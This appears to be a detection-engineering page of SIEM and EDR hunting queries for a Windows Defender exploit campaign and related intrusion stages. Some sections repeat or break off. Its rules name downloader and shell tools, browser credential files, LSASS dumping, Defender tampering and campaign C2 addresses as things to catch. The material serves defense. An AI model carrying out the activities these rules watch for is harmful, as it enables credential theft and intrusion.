    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")

| `drop_dm_object_name(Filesystem)`

    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Nightmare-Eclipse disguised loader FunnyApp.exe execution · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Article-specific behavioural hunt — GitLab Suspends Windows Exploit Researcher Nightmare-Eclipse After GitHub Ban
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Nightmare-Eclipse Defender exploit sample (SHA256 a2b6c7...) execution or drop · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Nightmare-Eclipse C2 callback to staybud.dpdns.org or campaign IPs · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Windows Defender signature update pipeline silently stalled (UnDefend behavior) · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
[LLM] Nightmare-Eclipse Defender exploit sample (SHA256 a2b6c7...) execution or drop Installation High
Alerts on execution, image-load or write of the confirmed Nightmare-Eclipse PoC sample distributed alongside the BlueHammer/RedSun/UnDefend toolkit. Hash-grade IOC, high fidelity. Rationale: Pivots directly on the SHA256 IOC a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c published with the article. Hash matches are exact and high-fidelity; covering both process-create and file-write captures dropper-stage and execution-stage hits.
ATT&CKT1068 T1562.001 T1204.002
Data sourcesEndpoint.Processes Endpoint.Filesystem
let BadSha256 = "a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c";
let ProcHits = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where SHA256 =~ BadSha256
    | project Timestamp, Source = "DeviceProcessEvents", DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
              InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256;
let FileHits = DeviceFileEvents
    | where Timestamp > ago(30d)
    | where SHA256 =~ BadSha256
    | project Timestamp, Source = "DeviceFileEvents", DeviceName,
              AccountName = InitiatingProcessAccountName,
              FileName, FolderPath,
              ProcessCommandLine = InitiatingProcessCommandLine,
              InitiatingProcessFileName, InitiatingProcessCommandLine = InitiatingProcessCommandLine, SHA256;
union ProcHits, FileHits
| order by Timestamp desc
let BadSha256 = "a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c";
let ProcHits = ImProcessCreate
    | where TimeGenerated > ago(30d)
    | where SHA256 =~ BadSha256
    | project TimeGenerated, Source = "ImProcessCreate", DvcHostname, ActorUsername,
              ActingProcessName, ActingProcessCommandLine,
              ParentProcessName, ParentProcessCommandLine, SHA256;
let FileHits = ImFileEvent
    | where TimeGenerated > ago(30d)
    | where TargetFileSHA256 =~ BadSha256
    | project TimeGenerated, Source = "ImFileEvent", DvcHostname, ActorUsername,
              ActingProcessName, ActingProcessCommandLine,
              ParentProcessName = "", ParentProcessCommandLine = "",
              SHA256 = TargetFileSHA256;
union ProcHits, FileHits
| order by TimeGenerated desc

[LLM] Nightmare-Eclipse C2 callback to staybud.dpdns.org or campaign IPs Command & Control High
Detects DNS lookups or outbound network connections to the campaign's published C2 infrastructure (staybud.dpdns.org and IPs 78.29.48.29 / 212.232.23.69 / 179.43.140.214) observed in active exploitation of the BlueHammer/RedSun/UnDefend toolkit. Rationale: Hash-grade network IOCs published with the article (three campaign IPs and one DDNS-style C2 domain). Triggered union across DNS + connection telemetry catches both the lookup and post-resolution callback; the .dpdns.org subdomain is rare enough to require no allow-listing.
ATT&CKT1071.001 T1568
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS
let BadIPs = dynamic(["78.29.48.29","212.232.23.69","179.43.140.214"]);
let BadDomain = "staybud.dpdns.org";
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP in (BadIPs)
      or RemoteUrl has BadDomain
| project Timestamp, DeviceName,
          InitiatingProcessAccountName,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine,
          InitiatingProcessFolderPath,
          RemoteIP, RemotePort, RemoteUrl, Protocol, ActionType
| order by Timestamp desc
let BadIPs = dynamic(["78.29.48.29","212.232.23.69","179.43.140.214"]);
let BadDomain = "staybud.dpdns.org";
let NetHits = ImNetworkSession
    | where TimeGenerated > ago(30d)
    | where DstIpAddr in (BadIPs) or DstHostname has BadDomain or Url has BadDomain
    | project TimeGenerated, Source = "ImNetworkSession", DvcHostname, SrcIpAddr, DstIpAddr, DstPortNumber, DstHostname, Url, NetworkApplicationProtocol;
let DnsHits = ImDnsActivity
    | where TimeGenerated > ago(30d)
    | where DnsQuery has BadDomain
    | project TimeGenerated, Source = "ImDnsActivity", DvcHostname, SrcIpAddr, DstIpAddr = DstIpAddr, DstPortNumber = int(null), DstHostname = DnsQuery, Url = DnsQuery, NetworkApplicationProtocol = "dns";
let CefHits = CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationIP in (BadIPs) or RequestURL has BadDomain or DestinationHostName has BadDomain
    | project TimeGenerated, Source = "CommonSecurityLog", DvcHostname = SourceHostName, SrcIpAddr = SourceIP, DstIpAddr = DestinationIP, DstPortNumber = DestinationPort, DstHostname = DestinationHostName, Url = RequestURL, NetworkApplicationProtocol = ApplicationProtocol;
union NetHits, DnsHits, CefHits
| order by TimeGenerated desc

description: Detects outbound network connections or DNS queries to the Nightmare-Eclipse campaign C2 infrastructure delivering BlueHammer/RedSun/UnDefend.
references:
  - https://cybersecuritynews.com/windows-exploit-researcher-suspended/
author: Detection Engineering
date: 2026/05/27
tags:
  - attack.t1071.001
  - attack.t1568
logsource:
  category: network_connection
  product: windows
detection:
  selection_ip:
    DestinationIp:
      - '78.29.48.29'
      - '212.232.23.69'
      - '179.43.140.214'
  selection_dns:
    DestinationHostname|contains: 'staybud.dpdns.org'
  condition: 1 of selection*
level: high
(source:windows.sysmon AND @EventID:(3 OR 22) AND (@DestinationIp:(78.29.48.29 OR 212.232.23.69 OR 179.43.140.214) OR @DestinationHostname:*staybud.dpdns.org* OR @QueryName:*staybud.dpdns.org*)) OR (source:windows.defender AND @RemoteIP:(78.29.48.29 OR 212.232.23.69 OR 179.43.140.214))
case {
  #event_simpleName=NetworkConnectIP4 RemoteAddressIP4=/^(78\.29\.48\.29|212\.232\.23\.69|179\.43\.140\.214)$/ ;
  #event_simpleName=DnsRequest DomainName=/(^|\.)staybud\.dpdns\.org$/i ;
}
| groupBy([aid, ComputerName, ContextImageFileName, #event_simpleName, RemoteAddressIP4, DomainName, RemotePort], function=count())
NETWORK
Toggle if your env has no CIM data-model acceleration.

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Network_Traffic.All_Traffic WHERE (All_Traffic.dest_ip IN ("78.29.48.29","212.232.23.69","179.43.140.214") OR All_Traffic.dest IN ("78.29.48.29","212.232.23.69","179.43.140.214")) BY All_Traffic.src All_Traffic.user All_Traffic.dest All_Traffic.dest_port All_Traffic.app
| `drop_dm_object_name(All_Traffic)`

[LLM] Nightmare-Eclipse disguised loader FunnyApp.exe execution Delivery Medium
Detects execution of the disguised loader filename FunnyApp.exe reported by Huntress as the deployment wrapper for the BlueHammer/RedSun/UnDefend Defender exploit toolkit. Pairs with hash/network IOCs. Rationale: Article explicitly cites Huntress observing the loader under the disguised filename FunnyApp.exe. Match is on the literal binary name with a suspicious-path enrichment so analysts can prioritise Downloads/Temp/ProgramData hits — the most likely staging locations after FortiGate-VPN initial access.
ATT&CKT1036.005 T1204.002
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "FunnyApp.exe"
| extend SuspiciousPath = FolderPath matches regex @"(?i)\\(Users\\[^\\]+\\(Downloads|Desktop|AppData\\Local\\Temp)|Windows\\Temp|ProgramData)\\"
| project Timestamp, DeviceName, AccountName, FolderPath, FileName, ProcessCommandLine, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath,
          ProcessVersionInfoCompanyName, ProcessVersionInfoOriginalFileName, SuspiciousPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith @"\FunnyApp.exe"
| extend SuspiciousPath = NewProcessName matches regex @"(?i)\\(Users\\[^\\]+\\(Downloads|Desktop|AppData\\Local\\Temp)|Windows\\Temp|ProgramData)\\"
| project TimeGenerated, Computer, SubjectUserName, TargetUserName, NewProcessName, CommandLine, ParentProcessName, SuspiciousPath
| order by TimeGenerated desc
title: Nightmare-Eclipse Disguised Loader FunnyApp.exe Execution

[LLM] Windows Defender signature update pipeline silently stalled (UnDefend behavior) Actions on Objectives Medium
Hunt for the UnDefend telemetry signature: hosts that are actively reporting telemetry but whose Defender signature pipeline has not produced an AntivirusDefinitionsUpdated event for >48h, suggesting the unpatched UnDefend tool has frozen the update channel without raising native health alerts. Rationale: UnDefend's defining property per the article is that it freezes Defender's signature pipeline without raising native health alerts — so the detection has to come from absence. The hunt anti-joins live-telemetry devices against AntivirusDefinitionsUpdated events and enriches with Defender-registry tamper writes, surfacing exactly the silent-degradation state the article describes.
ATT&CKT1562.001 T1562.006
Data sourcesEndpoint.Processes
let LookbackDays = 7d;
let StaleThreshold = 2d;
let ActiveDevices = DeviceInfo
    | where Timestamp > ago(1d)
    | summarize LastSeen = max(Timestamp) by DeviceId, DeviceName
    | where LastSeen > ago(6h);
let SigUpdates = DeviceEvents
    | where Timestamp > ago(LookbackDays)
    | where ActionType in ("AntivirusDefinitionsUpdated","AntivirusEmergencyUpdate","AntivirusDefinitionsUpdateFailed")
    | summarize LastSigEvent = max(Timestamp),
                LastSigSuccess = maxif(Timestamp, ActionType in ("AntivirusDefinitionsUpdated","AntivirusEmergencyUpdate")),
                FailedAttempts = countif(ActionType == "AntivirusDefinitionsUpdateFailed")
      by DeviceId;
ActiveDevices
| join kind=leftouter SigUpdates on DeviceId
| where isnull(LastSigSuccess) or LastSigSuccess < ago(StaleThreshold)
| extend RegistryTamperLookback = ago(LookbackDays)
| join kind=leftouter (
    DeviceRegistryEvents
    | where Timestamp > ago(LookbackDays)
    | where RegistryKey has_any (@"\Microsoft\Windows Defender\Signature Updates",
                                @"\Microsoft\Windows Defender\Real-Time Protection",
                                @"\Policies\Microsoft\Windows Defender")
    | summarize TamperCount = count(),
                AnyTamperProcess = make_set(InitiatingProcessFileName, 5)
      by DeviceId
  ) on DeviceId
| project DeviceName, DeviceId, LastSeen, LastSigSuccess, LastSigEvent, FailedAttempts, TamperCount, AnyTamperProcess
| order by LastSigSuccess asc nulls first
let LookbackDays = 7d;
let StaleThreshold = 2d;
let ActiveHosts = Heartbeat
    | where TimeGenerated > ago(1d)
    | summarize LastSeen = max(TimeGenerated) by Computer
    | where LastSeen > ago(6h);
let SigUpdates = Event
    | where TimeGenerated > ago(LookbackDays)
    | where Source == "Microsoft-Windows-Windows Defender"
    | where EventID in (2000, 2001, 2002)  // 2000=signature loaded, 2001=update success, 2002=update failed
    | summarize LastSigSuccess = maxif(TimeGenerated, EventID in (2000,2001)),
                FailedAttempts = countif(EventID == 2002)
      by Computer;
let RegTamper = ImRegistryEvent
    | where TimeGenerated > ago(LookbackDays)
    | where RegistryKey has_any ("Microsoft\\Windows Defender\\Signature Updates",
                                 "Microsoft\\Windows Defender\\Real-Time Protection",
                                 "Policies\\Microsoft\\Windows Defender")
    | summarize TamperCount = count(),
                TamperProcesses = make_set(ActingProcessName, 5)
      by Computer = DvcHostname;
ActiveHosts
| join kind=leftouter SigUpdates on Computer
| where isnull(LastSigSuccess) or LastSigSuccess < ago(StaleThreshold)
| join kind=leftouter RegTamper on Computer
| project Computer, LastSeen, LastSigSuccess, FailedAttempts, TamperCount, TamperProcesses
| order by LastSigSuccess asc nulls first
source:windows.defender (@EventID:2002 OR @EventID:5007) AND (@FilePath:*\\Windows\\Defender\\* OR @TargetObject:*\\Windows\\Defender\\Signature\\Updates\\* OR @TargetObject:*\\Windows\\Defender\\Real-Time\\Protection\\*)
#event_simpleName=AsepValueUpdate
| RegObjectName=/\\Microsoft\\Windows Defender\\(Signature Updates|Real-Time Protection|Spynet)/i
| groupBy([aid, ComputerName, ContextImageFileName, RegObjectName, RegValueName, RegStringValue], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Processes WHERE (Processes.process_name="MpCmdRun.exe" OR Processes.process_name="MsMpEng.exe" OR Processes.process_name="NisSrv.exe") AND (Processes.process="*SignatureUpdate*" OR Processes.process="*-RemoveDefinitions*" OR Processes.process="*-DisableIOAVProtection*") BY Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime FROM datamodel=Endpoint.Processes WHERE (Processes.process_name="MpCmdRun.exe" OR Processes.process_name="MsMpEng.exe" OR Processes.process_name="NisSrv.exe") AND (Processes.process="*SignatureUpdate*" OR Processes.process="*-RemoveDefinitions*" OR Processes.process="*-DisableIOAVProtection*") BY Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-33825")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-33825")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    [| tstats summariesonly=false earliest(_time) AS exec_time

         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
